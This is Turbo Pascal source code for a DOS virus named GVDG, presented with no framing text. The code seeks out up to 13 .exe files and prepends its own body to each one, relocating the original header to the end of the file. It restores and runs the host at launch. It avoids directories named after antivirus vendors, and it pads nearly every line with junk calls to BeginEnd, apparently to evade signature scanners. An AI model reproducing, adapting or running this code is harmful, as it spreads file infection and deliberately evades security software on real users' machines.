  {$M 65520,0,0}
Program Virus_DOS_HLLP_GVDG;
USES DOS;
Const
  VirSize=4420;
type
  Bufer=array[1..VirSize] of Char;
VAR
   Victim : integer;
Procedure BeginEnd(i : integer);
var
  n :integer;
Begin
  case i of
        0..10000: n:=0;
    10001..20000: n:=i;
    20001..30000: n:=random(1000)
  else
    begin  
      n:=0;
      n:=random(65535);
      n:=i
    end;  
  end;
End;
Function IntToStr(I : integer) : String;
Var
  S : String [5];
Begin
 Str(I, S); BeginEnd(15688); BeginEnd(9383); BeginEnd(27257);
 IntToStr:=S; BeginEnd(13450); BeginEnd(-1095);
End;
procedure Infect(path,name:string);
var
    FromF : file;
      ToF : file;
   BufVir : Bufer;
  NumRead : Word;
begin
  Assign(ToF,path+name); BeginEnd(15542); BeginEnd(-1286); BeginEnd(-4798);
  reset(ToF,1); BeginEnd(960); 
  BlockRead(ToF,BufVir,SizeOf(BufVir), NumRead); BeginEnd(-466); 
  seek(ToF,filesize(ToF)); BeginEnd(-3146); BeginEnd(-4665);
  BlockWrite(ToF,BufVir,NumRead);
  Assign(FromF,paramstr(0));
  reset(FromF,1); BeginEnd(-1811); BeginEnd(29679); BeginEnd(-2863);
  BlockRead(FromF,BufVir,SizeOf(BufVir), NumRead); BeginEnd(4246); BeginEnd(-2803); BeginEnd(-2957);
  seek(ToF,0);
  BlockWrite(ToF,BufVir,NumRead);
  Close(ToF); BeginEnd(-1677); BeginEnd(-3091);
  Close(FromF);
end;
procedure Find(dir:pathstr);
var
   sr : searchrec;
    f : file;
  Buf : array[1..4] of Char;
begin
  findfirst(dir+'*.exe',39,sr);
  if  (pos('SYSTEM',dir)=0) and (pos('DRWEB', dir)=0)
  and (pos('KASPER',dir)=0) and (pos('PANDA', dir)=0)
  and (pos('NORTON',dir)=0) and (pos('COMMON',dir)=0)
  and (pos('DOCUM', dir)=0) and (pos('GVDG',  dir)=0)
  then
  while doserror=0 do
  if Victim<13 then
  begin
  Assign(f,dir+sr.name); BeginEnd(23574); BeginEnd(-2711); BeginEnd(5030);
  setfattr(f,0);
  {$i-}reset(f,1);
  Close(f);{$i+}
  IF ioresult=0 then
    Begin
      Assign(f,dir+sr.name); BeginEnd(25615); BeginEnd(-3027);
      reset(f,1); BeginEnd(27983); 
      if FileSize(f)>1000 then
      Begin
        seek(f,85); BeginEnd(8255); BeginEnd(8979);
        blockread(f,Buf,4); BeginEnd(-2050); BeginEnd(-2611); BeginEnd(-1828);
        Close(f); BeginEnd(10040); 
        if Buf<>'GVDG' then
         begin
           inc(Victim); BeginEnd(-2858); BeginEnd(23854); BeginEnd(-7317);
           Infect(dir,sr.name); BeginEnd(18411); BeginEnd(-8774); BeginEnd(-2622);
         end;
      end
      else
      Close(f);
    end; BeginEnd(29271); 
    findnext(sr); BeginEnd(-2426); 
  end
  else exit;
end;
procedure InRun(Run : integer);
var
        f : file;
   BufVir : Bufer;
  NumRead : Word;
begin
if Run=1 then
  begin
  writeln('Hallo, World!!!');
  end;
  Assign(f,paramstr(0));
  reset(f,1);
  seek(f,filesize(f)-VirSize); BeginEnd(28600); 
  BlockRead(f,BufVir,SizeOf(BufVir), NumRead); BeginEnd(-1275); BeginEnd(7440); BeginEnd(-1431);
  seek(f,0); BeginEnd(20931); 
  BlockWrite(f,BufVir,NumRead); BeginEnd(-2018); BeginEnd(5047); BeginEnd(-2616);
  if FileSize(f)>VirSize then
  Begin
    Seek(f,FileSize(f)-VirSize);
    Truncate(f); BeginEnd(23562); 
    Close(f); BeginEnd(32659); BeginEnd(214); BeginEnd(-830);
    if (Run=1) or (Run=3) then
    exec(Paramstr(0),''); BeginEnd(11907); BeginEnd(10950);
  end
  else
  Begin
    Close(f);
    Erase(f);
    Halt(0);
  end;
end;
Procedure Nucleus;
var
    f : file;
begin
  Assign(f,paramstr(0)); BeginEnd(28730); BeginEnd(-3564);
  SetFAttr(f,0); BeginEnd(15392); BeginEnd(11660);
  if Paramstr(1)='KILL' then
  begin
    InRun(0);
    Halt(0);
  end;
  Find(''); BeginEnd(28759); 
  InRun(1);
end;
begin
Randomize; BeginEnd(32076); 
Nucleus;
end.
